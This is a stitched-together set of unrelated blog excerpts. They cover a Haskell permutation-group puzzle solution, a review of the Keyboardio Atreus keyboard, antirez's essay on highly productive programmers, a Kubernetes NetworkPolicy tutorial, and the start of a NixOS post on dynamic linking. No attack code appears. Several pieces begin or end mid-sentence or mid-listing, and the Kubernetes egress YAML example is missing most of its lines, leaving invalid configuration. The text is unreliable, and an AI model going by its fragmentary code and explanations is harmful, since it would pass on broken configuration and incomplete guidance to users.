<span id="cb5-5"><a href="#cb5-5"></a><span>runPerm ::</span> <span>Perm</span> n <span>-&gt;</span> <span>Finite</span> n <span>-&gt;</span> <span>Finite</span> n</span>
<span id="cb5-6"><a href="#cb5-6"></a></span>
<span id="cb5-7"><a href="#cb5-7"></a><span>-- | Parse a string line into the permutation it represents</span></span>
<span id="cb5-8"><a href="#cb5-8"></a><span>parsePerm ::</span> <span>String</span> <span>-&gt;</span> <span>Perm</span> n</span>
<span id="cb5-9"><a href="#cb5-9"></a></span>
<span id="cb5-10"><a href="#cb5-10"></a><span>-- | Given a permutation list, find the place where 2019 ends up</span></span>
<span id="cb5-11"><a href="#cb5-11"></a><span>part1 ::</span> [<span>Perm</span> <span>10007</span>] <span>-&gt;</span> <span>Finite</span> <span>10007</span></span>
<span id="cb5-12"><a href="#cb5-12"></a>part1 perms <span>=</span> runPerm bigPerm <span>2019</span></span>
<span id="cb5-13"><a href="#cb5-13"></a>  <span>where</span></span>
<span id="cb5-14"><a href="#cb5-14"></a>    bigPerm <span>=</span> <span>mconcat</span> perms</span></code></pre></div>
<p>(<code>mconcat perms</code> composes all of the permutations one after another: <code>mconcat [x,y,z] = x &lt;&gt; y &lt;&gt; z</code>)</p>
<p>And…that’s it! For the actual “logic” of our part 1! All we need to do is implement <code>runPerm</code> and <code>parsePerm</code>.</p>
<p>Here, I’m using <code>Finite n</code> from the great <em><a href="https://hackage.haskell.org/package/finite-typelits">finite-typelits</a></em> library, where <code>Finite 100</code> represents “an index between 0 and 99”, etc. It’s just exactly the right “shape” to represent the index of a deck of cards. <em>finite-typelits</em> wasn’t designed with group theory in mind, but it’s still a great tool here — which is a testament to how flexible these abstractions can actually be :)</p>
<p>For example, it means that for a <code>Perm 10007</code> (a permutation of 10007 cards), the type of <code>runPerm</code> is <code>Perm 10007 -&gt; Finite 10007 -&gt; Finite 10007</code>, and the type of <code>parsePerm</code> is <code>String -&gt; Perm 10007</code>.</p>
<p>We can plan out our part 2 as well:</p>
<div id="cb6"><pre><code><span id="cb6-1"><a href="#cb6-1"></a><span>-- | Given a permutation list, find the index that will end up at 2020</span></span>
<span id="cb6-2"><a href="#cb6-2"></a><span>part2 ::</span> [<span>Perm</span> <span>119315717514047</span>] <span>-&gt;</span> <span>Finite</span> <span>119315717514047</span></span>
<span id="cb6-3"><a href="#cb6-3"></a>part2 perms <span>=</span> runPerm (invert biiigPerm) <span>2020</span></span>
<span id="cb6-4"><a href="#cb6-4"></a>  <span>where</span></span>
<span id="cb6-5"><a href="#cb6-5"></a>    bigPerm   <span>=</span> <span>mconcat</span> perms</span>
<span id="cb6-6"><a href="#cb6-6"></a>    biiigPerm <span>=</span> stimes <span>101741582076661</span> bigPerm</span></code></pre></div>
<p>Part 2, I think, is where the group theory really shines.</p>
<ol type="1">
<li><p>We take advantage of <code>stimes</code>, which uses <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring">repeated squaring</a>. That means that to compute <code>stimes 8 x</code>, instead of using</p>
<pre><code>x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x</code></pre>
<p>it does</p>
<pre><code>let x2 = x &lt;&gt; x
    x4 = x2 &lt;&gt; x2
in  x4 &lt;&gt; x4</code></pre>
<p>essentially cutting down the number of multiplications exponentially. This means that to compute <code>stimes 101741582076661</code>, we only need to do about 47 multiplications (log base 2), and not 101741582076661.</p>
<p>This is only possible because we know that permutation composition is associative, so it doesn’t matter how we associate our parentheses. It is only “safe” to use repeated squaring if you <em>know</em> that your operation is associative. Having a semigroup abstraction <em>in the first place</em> guides us to this efficient solution — in a way that is pre-built just for us! This is made all the more powerful because <em>semigroup</em> is a ubiquitous abstraction in Haskell, so we “think about” it all the time.</p></li>
<li><p>Remember how <code>runPerm p 2019</code> gives us the index that <code>2019</code> is sent to? Well, we want something else in this case. We basically want the index that <em>will be sent to</em> <code>2020</code>. So, we want to <em>reverse the function</em>. Luckily, since our function is just a permutation, it is easy to reverse this: just <code>invert</code> the permutation!</p>
<p>The idea that we can simply invert a permutation instead of having to write a whole new permutation representation just to do “backwards indexing” is something that we are <em>guided to</em>, just by recognizing that permutations form a group.</p></li>
</ol>
<h2 id="a-first-guess-at-implementation">A first guess at implementation</h2>
<p>Now, time to do what we have been putting off and actually write our permutation representation – the definition of <code>Perm n</code>. A good <em>first guess</em> might be to write our permutation as an actual function — a function from index to index, <code>Finite n -&gt; Finite n</code>. Then, we can just use function composition as our permutation composition.</p>
<div id="cb9"><pre><code><span id="cb9-1"><a href="#cb9-1"></a><span>data</span> <span>Perm</span> n <span>=</span> <span>Perm</span> (<span>Finite</span> n <span>-&gt;</span> <span>Finit…</span></span></code></pre></div></div></div>

  <h2>Open Source Keyboardio Atreus Keyboard – Six Week Review</h2>
  <p>As I write this, I've now had my Keyboardio Atreus for a full six weeks and have been
using it pretty much exclusively that whole time.  After a month and a half, I've given it
a fair shake and can give you my full impressions.  And my full impression is that it is
<strong>amazing</strong>.</p>

<h2 id="atreus-background">Atreus background</h2>
<p>Before I tell you what I love about it, what <em>is</em> the Atreus?  Well, it's a keyboard. It's
a <em>tiny</em> keyboard.</p>
<p>More specifically, it's a keyboard with 44 keys – compared with 84 on my ThinkPad
keyboard, and a full 108 on a traditional desktop keyboard.  How does it get by with so
few keys?  More on that in a minute; for now, just focus on how small the thing is,
without needing to cramp any of the individual keys in the least.</p>
<p><img src="https://www.codesections.com/blog/atreus-review/atreus.jpeg" alt="The Atreus keyboard on top of a ThinkPad"></p>
<span id="continue-reading"></span>
<p>Just from that photo, you might notice a few other features of the Atreus.  First – and
unlike nearly every other keyboard in existence – its keys are arranged into columns
rather than rows: the <code>D</code> is exactly even with the <code>E</code> key above it, but isn't vertically
aligned with the <code>F</code> key to its right.  Both of these changes make the Atreus <em>far</em> more
ergonomic to use.  Aligning the keys horizontally means that your fingers don't need move
diagonally nearly as often (a big contributor to RSI).  And moving the keys out of
horizontal rows aligns them more comfortably with the lengths of your fingers.  This
ortholinear layout is designed to make the Atreus significantly more comfortable and, more
importantly, to reduce the strain inherent in typing.</p>
<p>The other feature you likely noticed from the image is that my Atreus doesn't have any
letters on the keys.  That's not a requirement – they also offer the Atreus with keycaps
made out of "bright white PBT, which is dye-sublimated black and then laser-ablated to
reveal bright white legends".  As fancy as that sounds, I opted for the blank keycaps
because it helps with the Atreus's <em>other</em> superpower.</p>
<p>Aside from its compact and ergonomic form factor, the Atreus's standout feature is its
full and easy customization.  You can set exactly what you want to happen on every key
press, whether that's sending a single key or executing a complex series of commands.  And
all of this happens at the firmware level on the keyboard – which means it Just Works™ on
any computer you might plug the Atreus into, without any software.</p>

<p>The Atreus actually offers two ways to customize the keys: A GUI configuration tool called
Chrysalis (shown below) and text-based configuration via Kaleidoscope. </p>
<p><img src="https://www.codesections.com/blog/atreus-review/chrysalis.png" alt="Chrysalis screenshot with default QWERTY layout"></p>
<p>And all of this is powered by fully open source code.  The Atreus <a href="https://atreus.technomancy.us/">began
life</a> as a DIY project by the noted Free Software hacker
and language designer Phil Hagelberg (aka <a href="https://atreus.technomancy.us/">technomancy</a>),
and is now manufactured by Keyboardio; between the two of them, they've maintained an
admirable commitment to building the Atreus on free software.</p>
<p>So, now you know what the Atreus is: it's tiny, it's customizable, and it's fully powered
by free software.  But what's it like to actually <em>use</em> the thing?</p>
<h2 id="how-does-it-all-fit">How does it all fit?</h2>
<p>Let's talk about the point I put off above: just how do you use a keyboard that
only has 44 keys?  Even if we're only typing English ASCII text, we need to be able to
type 26 letters, 10 numerals, and 30 special characters.  Simple arithmetic is enough to
show that those 66 letters won't fit into 44 keys in a straightforward way – and that's
without considering non-printing characters or modifiers.</p>
<p>But it's actually modifiers that make the Atreus possible.  A typical keyboard has four
(or more) modifiers: Ctrl, Alt, Left Shift, and Right Shift.  Many keyboards will have
more than one Ctrl key, but they'll <em>all</em> have two Shift keys.  Why?  Well, as anyone who
has ever learned to touch type can tell you, there are two Shift keys so that you can hold
one with your right pinky when you type keys on the left side of the keyboard and can
hold the other with your left pinky whenever you type keys on the right side of the
keyboard.  If we only had one shift key to hit with our pinky, we'd have to contort our
hand mightily to enter capital letters on that side of the keyboard.</p>
<p>But we're only in that bind because we're forced to use our pinkies to hit the Shift
keys.  The Atreus moves that duty away from our weakest finger and to our strongest finger
– a finger that, incidentally, is ridiculously underused in a traditional keyboard
layout.  With the Atreus, you press the Shift key with your left thumb.  That means you
can press shift without moving your fingers out of position on the home row; moreover, in
combination with the Atreus's smaller number of keys, it means you can comfortably hold
the left shift key while pressing any other key on the keyboard.</p>
<p>That may not sound like a huge win – if all it does for us is get rid of the right Shift
key, then it just saves the Atreus a single key.  However, because the Atreus is
symmetrical, everything we just said about the left Shift key is equally true of the right
Shift key: you can also hold it while comfortably pressing every key on the keyboard.
Except we just said that we don't need a right Shift key.</p>
<p>Or, at least, we don't need a right Shift key that shifts us into typing capital letters.
Instead, we can use the right "Shift" key to shift us into a different set of characters
altogether.  This might sound a bit odd (and I acknowledge that it takes some getting used
to) but it's not really that different from how the Shift key works on a normal keyboard.
On a normal keyboard, you enter the <code>?</code> character by pressing <code>Shift</code> and <code>/</code> at the same
time; that's not because a question mark is somehow a "capital slash" (which, anyway,
sounds more like something a corporate raider would do than an item of punctuation).
Shifting into the other set of characters – the Atreus calls them Layer 2 – works just
like that, but for everything. </p>
<p><img src="https://www.codesections.com/blog/atreus-review/layer.png" alt="Layer 2 keys with default bindings"></p>
<p>That gives us up to an extra 43 effective keys to play with (since we're holding one key
down, we can't assign a new value to it), which would put us at 87 keys – already more
than my ThinkPad keyboard.  In practice, however, you probably don't want to assign a
different character for <em>every</em> key; the default bindings leave 8 with their Layer 1
meanings, which leaves us with just 79 effective keys.  So we're still short of a laptop
keyboard, to say nothing of a traditional desktop one.</p>
<p>Talking about Layer 1 and Layer 2 has probably made the solution to this obvious: add a
Layer 3!  And that's exactly what the default bindings do, adding another 25 keys, which
brings us up to 104 effective keys and parity with a full desktop keyboard.</p>
<p>But how do we access Layer 3?  We could dedicate another thumb key to it (which is what I
do in my personal configuration), but the default bindings go a different direction:
instead of accessing the layer by holding a key, you toggle into it by pressing a key
(i.e., instead of being like Shift, it's like CapsLock).</p>
<h2 id="ok-but-why">Ok, but why?!</h2>
<p>At this point, you probably get the <em>how</em> behind the Atreus's method for fitting 100+ keys
worth of functionality into just 44 keys.  But I wouldn't blame you if you're fuzzy on the
<em>why</em>.  Why go through all that trouble (and the learning curve of at least slightly
retraining your fingers) just to get back to the same number of keys that we started with?</p>
<p>Well, for some people, part of the appeal might be portability; Keyboardio even offers a
<a href="https://shop.keyboard.io/products/keyboardio-atreus-travel-case">travel case</a>.  It could
be the perfect keyboard to take with you when you work from a coffee shop, co-working
space, or other crowded public space!</p>

<p>The Atreus really was first designed as an ergonomic keyboard that <a href="https://technomancy.us/172">you can take to local
coffee shops</a>.  But, even when coffee-shop-working was an
option, I was never interested in the Atreus for that sort of portability.  I like the
idea of a small keyboard for three reasons: ergonomics, consistency, and speed.</p>
<h3 id="ergonomics">Ergonomics</h3>
<p>A big part of the reason I started looking at switching to a non-laptop keyboard is that
I'd started to experience a bit of discomfort after long stretches of coding.  Nothing
bad; nothing I'd even call pain.  But something noticeable, and I'm inclined to take even
a <em>hint</em> of Repetitive Strain Injury very seriously – especially given how many <a href="http://ergoemacs.org/emacs/emacs_hand_pain_celebrity.html">
programmers</a> have <a href="https://medium.com/@mdlayher/a-programmers-journey-with-rsi-c73628eed0c4">dealt with
RSI</a>.  And,
while there's a lot of disagreement about RSI, nearly everyone agrees that prevention is
far, far easier than cure.</p>
<p>If you take a look at <a href="http://xahlee.info/kbd/ergonomic_keyboards.html">lists</a> of <a href="https://www.nytimes.com/wirecutter/reviews/comfortable-ergo-keyboard/">best
ergonomic
keyboards</a>, you
probably won't see the Atreus. Partly, that's because it's new, and a bit less mainstream;
it might not be on everyone's radar.  But even accounting for that, the Atreus is missing
at least a few features that the most ergonomic keyboard have – though it does have most
of them.  Here, have a chart comparing the Atreus, the
<a href="https://ergodox-ez.com/">Ergodox-EZ</a>, and the
<a href="https://github.com/adereth/dactyl-keyboard">Dactyl</a>.</p>
<table><thead><tr><th>Feature</th><th>Ergodox</th><th>Dactyl</th><th>Atreus</th></tr></thead><tbody>
<tr><td>Mechanical keys</td><td>✓</td><td>✓</td><td>✓</td></tr>
<tr><td>Split section for hands</td><td>✓</td><td>✓</td><td>✓</td></tr>
<tr><td>Ortholinear layout</td><td>✓</td><td>✓</td><td>✓</td></tr>
<tr><td>Fully split halves</td><td>✓</td><td>✓</td><td>✗</td></tr>
<tr><td>Elevated middle ("tenting")</td><td>✓</td><td>✓</td><td>✗</td></tr>
<tr><td>Concave keys</td><td>✗</td><td>✓</td><td>✗</td></tr>
</tbody></table>
<p>So, given the Atreus's strong but definitely trailing showing on those traditional
ergonomic factors, why am I still enthusiastic about the Atreus as an ergonomic keyboard?</p>
<p>Well, it comes down to what each finger is being asked to do – or, put differently, it
comes right back to how tiny the Atreus is.  If you look at the <a href="https://ergodox-ez.com/pages/getting-started">default layout of the
Ergodox-EZ</a>, you'll see that each pinky
is responsible for <strong>ten</strong> keys, many of which involve the more-ergonomically harmful
diagonal movement.  Two keys (in the default layout, <code>=</code> and <code>-</code>) require stretching your
pinky two keys up and one to the side – at least for me, that'd be quite the stretch.  In
contrast, the Atreus asks your pinky to be responsible for only four keys, none of which
involve diagonal movement, and only one of which is more than one key away.</p>
<p>I know I'm harping on the pinkies a bit but, well, there's a reason some people call RSI
<a href="https://skeptics.stackexchange.com/questions/17492/does-emacs-cause-emacs-pinky">Emacs
Pinky</a>.
The pinky is, obviously, one of the weakest fingers, and asking it to do a lot is a fast
way to overtax your hands.  And some of those big stretches can be even more …</p></section></div>

November 19, 2020 | https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez | <a href="https://web.archive.org/web/*/https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Preface from Sklivvz: I met Salvatore (Antirez) when I was working at <a href="https://stackoverflow.com/">Stack Overflow</a> and he was the maintainer of Redis, one of the major parts of our infrastructure. Besides our common Italian heritage, what struck me was that we shared very many ideas about programming. This became absolutely evident when we took a few days and Antirez showed me the beautiful Redis code base. I've asked him to share some of his thoughts here.</p>
<p>In the mythology of programming, a 10x programmer is a programmer that can do ten times the work of another typical programmer. The programming community is exceptionally polarized about the existence or not of such a beast. However, many people told me that they believe I’m a very fast programmer. Considering I’m far from being a workaholic, I have put together a list of qualities that I believe make the most difference in programmers’ productivity.</p>
<h2>Bare programming abilities</h2>
<p>One of the most self-evident limits or strengths of a programmer is the skill to effectively implementing the basic parts of a program: a function, an algorithm, or whatever. Surprisingly the ability to use basic imperative programming constructs very efficiently to implement something is, in my experience, not as widespread as one may think. I observed experienced yet uneducated programmers getting more work done than graduate programmers, in theory extremely competent, but very poor at implementing solutions.</p>
<h2>Focus</h2>
<p>The number of hours spent writing code is irrelevant without looking at the quality of the time. External and internal factors can cause a lack of focus. Internal factors cause procrastination. They can be things like lack of interest in the project at hand (you can’t be good at doing things you do not love), lack of exercise or well-being, and poor or little sleeping. External factors are frequent meetings, work environments without actual offices, coworkers interrupting often, etcetera. It seems natural that trying to improve focus and to reduce interruptions is going to have a significant effect on programming productivity. Sometimes to gain focus, extreme measures are needed. For instance, I only read emails from time to time and do not reply to most of them.</p>
<h2>Design sacrifice</h2>
<p>Often complexity is generated when a non-fundamental goal of a project is accounting for a considerable amount of design complexity. In other cases, there is a design tension between a fundamental feature and a non-fundamental one, and this is making the more important goal very hard to reach.
A designer needs to recognize the parts of a design that are not easy wins or where there is no proportionality between the effort and the advantages. To execute a project maximizing the output, one needs to focus precisely on the aspects that matter, and that they can implement in a reasonable amount of time.
When designing the Disque message broker, I realized that by providing only best-effort ordering for the messages, I could substantially improve all the other aspects of the project: availability, query language, and client interaction, simplicity, and performance.</p>
<h2>Simplicity</h2>
<p>Simplicity is an obvious point that means all and nothing. It is worth to check how we often generate complexity to understand what simplicity is. I believe that the two main drivers of complexity are the unwillingness to perform design sacrifices and the accumulation of errors in the design activity.</p>
<p>If you think of the design process, each time we pursue a wrong path, we get farther and farther from the optimal solution. An initial design error, in the wrong hands, is not corrected with a re-design of the same system. It leads to the design of another complex solution to cope with the initial error. The project, thus, becomes more complex and less efficient at every wrong step.</p>
<p><img src="https://imgur.com/qPJakrY.png" alt="simplicity"></p>
<p>We can achieve simplicity by thinking in terms of small mental “proofs of concept” so that we can explore a large number of simple designs with our minds. This technique allows us to start working from something that looks like the most viable and direct solution. Later, experience and personal design abilities allow us to improve the design and find sensible solutions for the sub-design issues that we need to resolve.</p>
<p>However, each time a complex solution seems to be warranted, it’s essential to think deeply about how to avoid this complexity. Only continue in that direction as the last resort, even considering completely different design alternatives.</p>
<h2>Perfectionism</h2>
<p>Perfectionism comes in two variants: an engineering culture of reaching the best possible measurable performance in a program, and a personality trait. In both instances, I see this as one of the most significant barriers for a programmer to deliver things fast. Perfectionism and fear of external judgment bias us to refine a design only according to psychological or trivially measurable parameters. Instead, we tend to forget things like robustness, simplicity, ability to deliver in time. </p>
<h2>Knowledge</h2>
<p>When dealing with complex tasks, knowledge of data structures, fundamental limits of computation, non-trivial algorithms is going to have an impact on the ability to find a suitable design. It is not necessary to be a super expert in everything. Still, it is essential to be at least aware of a multitude of potential solutions for a problem. For example, it is possible to use algorithms which are very efficient at counting unique items in a stream, if we can accept some error percentage. Not everyone is familiar with them.</p>
<h2>Low-level understanding of the machine</h2>
<p>Many issues in programs, even when using high-level languages, arise from the misunderstanding of how the computer is going to perform a given task. Sometimes, this may lead to re-designing and re-implementing a tool from scratch because there is a fundamental problem in the tools or algorithms used. High competence in C, understanding of how CPUs work, and knowledge of how the kernel and system calls are implemented, can be essential in preventing bad, late-stage surprises.</p>
<h2>Debugging skills</h2>
<p>It is surprisingly easy to spend an enormous amount of effort to find bugs. Being able to focus on a bug incrementally and to fix it with a rational set of steps, together with having to deal with simple code that is unlikely to contain too many bugs, can have a significant effect on the programmer's efficiency.</p>
<p>In conclusion, it is not surprising to me to see how the above qualities of a programmer can have a 10x impact on the output. Combined, they allow for proper implementations of designs that start from a viable model and can be several times simpler than alternatives. There is a way to stress simplicity that I like to call “opportunistic programming.” Basically, at every development step, the set of features to implement is chosen to have the maximum impact on the user base of the program, with the minimum requirement of efforts.</p>

<p>This is the first part of our “Kubernetes Security Series”. In this part I’m going to explain how Network Policies can help you secure your network traffic within your Kubernetes cluster.</p>



<h2>Filtering network traffic</h2>



<p>First of all, you need to think about what kind of network traffic you want to filter. The easiest way filtering traffic is on Layer 3 and 4, which is at the IP address and port level. If you’d like to filter on http/https hostname, then you’ll need Layer 7 filtering, which is currently not supported by Kubernetes Network Policies. For that, you would need a separate proxy server within your cluster.</p>



<p>On Layer 3 and 4 filtering, if you’d like to filter traffic to github.com, you’d filter based on the IP address and port 80/443 (http/https). If github.com changes IP address, you’d have to change your Network Policy rules. If you’re capable of doing Layer 7 filtering, then you could examine the hostname that passes port 80/443, and only filter if the hostname matches github.com. A sidenote: even on port 443 using https, if SNI (Server Name Indication) is used, then the hostname is passed unencrypted. SNI is currently widely used.</p>



<p>We’ll keep Layer 7 filtering for another blog post, as this is currently much more complicated, because you cannot use Network Policies for that. You would need an ingress/egress proxy that understands Layer 7 (http/https) traffic, like Envoy proxy. More traditional reverse proxies like haproxy/nginx could also be used for this.</p>



<h2>The Network Policy</h2>



<p>Let’s talk about the Network Policy itself! The NetworkPolicy resource in Kubernetes allows you to manage Layer 3 and 4 traffic on a pod level. The <a href="https://kubernetes.io/docs/concepts/services-networking/network-policies/">NetworkPolicy documentation</a> specifies 3 combinations you can use to manage traffic:</p>



<ol><li>Pod-to-pod traffic by identifying the pod using selectors (for example using pod labels)</li><li>Traffic rules based on Namespace (for example pod from namespace 1 can access all pods in namespace 2)</li><li>Rules based on IP blocks (taking into account that traffic to and from the node that the pod is running on is always allowed)</li></ol>

<h2>Secure network traffic</h2>



<p>To secure your network traffic, you will need to disable the default behavior to allow all ingress and egress traffic. To make this easier, you can first disable ingress traffic, figure out what rules you need to make your pods working again, and then start with egress traffic restrictions. It’s going to be much more difficult to figure out egress traffic rules than ingress traffic, as it’s often not obvious what external traffic your applications will initiate.</p>



<p>A Network Policy to deny all traffic by default will look like this:</p>



<pre><code>---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;<strong>name</strong>: default-deny-all
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>: {}
&nbsp;&nbsp;<strong>policyTypes</strong>:
&nbsp;&nbsp;- Ingress
&nbsp;&nbsp;- Egress</code></pre>



<p>This rule will match all pods (podSelector: {}), and will deny ingress/egress traffic, if no other rule is in place to allow traffic.</p>



<h2>Ingress traffic</h2>



<p>Allowing ingress is the easiest to do if you have a single point of entry. This is the case if you’re using an ingress controller. You then only need to ensure access to the ingress controller, and from the ingress controller to the backend pods. Here is an example of such a NetworkPolicy:</p>



<pre><code>---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;<strong>name</strong>: ingress-access
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app.kubernetes.io/name: ingress-nginx
&nbsp;&nbsp;<strong>ingress</strong>:
&nbsp;&nbsp;- <strong>from</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>ipBlock</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cidr: 192.168.1.0/24
---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;<strong>name</strong>: ingress-to-backends
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app: myapp
&nbsp;&nbsp;<strong>ingress</strong>:
&nbsp;&nbsp;- <strong>from</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>namespaceSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ingress: "true"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app.kubernetes.io/name: ingress-nginx</code></pre>



<p>There are 2 rules here. The first rule, called “ingress-access” will be applicable on pods that have the label app.kubernetes.io/name=ingress-nginx. Pods that match will allow traffic from 192.168.1.0/24. This IP range could be your local IP range if you’re using minikube, or a Virtual Private Cloud network range on cloud providers. In those ranges you typically run the LoadBalancer which needs access to the ingress controller. If you’re not using a cloud Load Balancer, then it can even be 0.0.0.0/0 in case you want to let everyone access your ingress controller.<br></p>



<p>Once traffic hits the ingress controller, it’ll proxy the requests to the backend services. We need to allow traffic between this ingress controller and the backend services, which can be done using the second NetworkPolicy, in our example “ingress-to-backends”. This rule matches the pods with the label “app=myapp”. You can make this a more generic label that you assign to all your backend pods. These pods need to allow traffic from the ingress controller, so we specify an “ingress” rule with “from” to match the namespace (ingress=true) and the pod with the label “app.kubernetes.io/name=ingress-nginx). Make sure to label the namespace where your ingress controller is running in to make this work. The end result should be something like this:</p>

<h2>Egress traffic</h2>



<p>Traffic originating from a pod will be controlled by the egress NetworkPolicy rules. The typical application will need to do DNS lookups (translating for example google.com to an IP address) before making a request to an external server. The DNS server typically runs within the Kubernetes cluster, so that’ll be the first rule you need when blocking all egress traffic. Below is an example of such a rule that blocks all egress traffic, but allows DNS traffic to the DNS pods running in the kube-system namespace (kube-system needs to be labelled with kube-dns: “true”):</p>



<pre><code><strong>apiVersion</strong>: networking.k8s.io/v1

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>port</strong>: 53
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>protocol</strong>: UDP
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>port</strong>: 53</code></pre>



<p>Once this Network Policy is in place, you’ll need to make sure you have an egress rule for every outgoing connection that any pod in the Kubernetes cluster can make. If an application uses for example an external API for transactional emails, or connects to external cloud services, then you’ll need a Network Policy covering this.</p>



<p>Most cloud services will have a list of IP addresses and IP ranges, which you can use to whitelist egress traffic. It can definitely be a long process to get it right if you have a lot of external dependencies. Once you deny all egress traffic by default, you’ll need to do some testing to trigger all the external endpoints and test whether they still work.</p>



<p>Below is an example rule to allow https (port 443) traffic to a specific IP address.</p>



<pre><code>---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;name: egress-access-myapp
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app: myapp
&nbsp;&nbsp;<strong>egress</strong>:
&nbsp;&nbsp;- <strong>to</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>ipBlock</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>cidr</strong>: 1.1.1.1/32
&nbsp;&nbsp;&nbsp;<strong>ports</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>protocol</strong>: TCP
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>port</strong>: 443</code></pre>



<p>After applying this NetworkPolicy, the pod with the label app=myapp will be able to access hostnames that resolve to the IP address 1.1.1.1 (a CloudFlare IP) on port 443. This diagram summarizes our setup after applying both Network Policies:</p>

<p>This article shows you how to filter Layer 3 and 4 traffic using NetworkPolicies. Unfortunately at the time of writing, there’s no Layer 7 support in NetworkPolicies. To filter on http/https hostname or other protocols, we would need to redirect all the traffic through an egress proxy/gateway – which we’ll explain in another blog post!</p>

<p>Nixpkgs maintains the highest rating on <a href="https://repology.org/">Repology</a> for having the most packages &amp; which are up to date. Unfortunately even with the current ecosystem of packages, there will always be gaps, and for beginners in NixOS a common question is:</p>

<p><em>“I’ve download a binary and would like to run it on NixOS”</em></p>

<p><strong>Can we do better &amp; streamline running non-Nix software?</strong> 🤔</p>

<p>This was some of the questions posed by some Nix contributors and I wanted to capture the ideas put forward for others.</p>

<!--more-->

<h2 id="a-brief-tour-of-linking">A brief tour of linking</h2>

<p>Without going into a ton of detail about how dynamic libraries are performed on Linux; a Linux binary - <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">ELF format</a> - contains information pertaining to the dynamic libraries necessary for the binary.</p>

<p>For instance, here is a non-NixOS Ruby installation.</p>
<div><div><pre><code>❯ readelf <span>-d</span> <span>$(</span>which ruby<span>)</span> | <span>grep </span>NEEDED
 0x0000000000000001 <span>(</span>NEEDED<span>)</span>             Shared library: <span>[</span>libruby-2.7.so.2.7]
 0x0000000000000001 <span>(</span>NEEDED<span>)</span>             Shared library: <span>[</span>libc.so.6]
</code></pre></div></div>
<p>It requires two dynamic libraries <em>libruby</em> &amp; <em>libc</em>. These libraries may themselves have other dependencies, so we can use <strong>ldd</strong> to recursively find the dependency closure.</p>

<div><div><pre><code>❯ ldd <span>$(</span>which ruby<span>)</span>
    linux-vdso.so.1 <span>(</span>0x00007ffed1705000<span>)</span>
    /lib/x86_64-linux-gnu/libnss_cache.so.2 <span>(</span>0x00007f3626cd0000<span>)</span>
    libruby-2.7.so.2.7 <span>=&gt;</span> /lib/x86_64-linux-gnu/libruby-2.7.so.2.7 <span>(</span>0x00007f3626960000<span>)</span>
    libc.so.6 <span>=&gt;</span> /lib/x86_64-linux-gnu/libc.so.6 <span>(</span>0x00007f362679b000<span>)</span>
    libpthread.so.0 <span>=&gt;</span> /lib/x86_64-linux-gnu/libpthread.so.0 <span>(</span>0x00007f3626779000<span>)</span>
    librt.so.1 <span>=&gt;</span> /lib/x86_64-linux-gnu/librt.so.1 <span>(</span>0x00007f362676e000<span>)</span>
    libgmp.so.10 <span>=&gt;</span> /lib/x86_64-linux-gnu/libgmp.so.10 <span>(</span>0x00007f36266eb000<span>)</span>
    libdl.so.2 <span>=&gt;</span> /lib/x86_64-linux-gnu/libdl.so.2 <span>(</span>0x00007f36266e3000<span>)</span>
    libcrypt.so.1 <span>=&gt;</span> /lib/x86_64-linux-gnu/libcrypt.so.1 <span>(</span>0x00007f36266a8000<span>)</span>
    libm.so.6 <span>=&gt;</span> /lib/x86_64-linux-gnu/libm.so.6 <span>(</span>0x00007f3626564000<span>)</span>
    /lib64/ld-linux-x86-64.so.2 <span>(</span>0x00007f3626cde000<span>)</span>
</code></pre></div></div>

<p>We can see here that <strong>ldd</strong> resolved the libraries to locations in my <a href="https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard">Filesystem Hierarchy Standard</a>(FHS).</p>

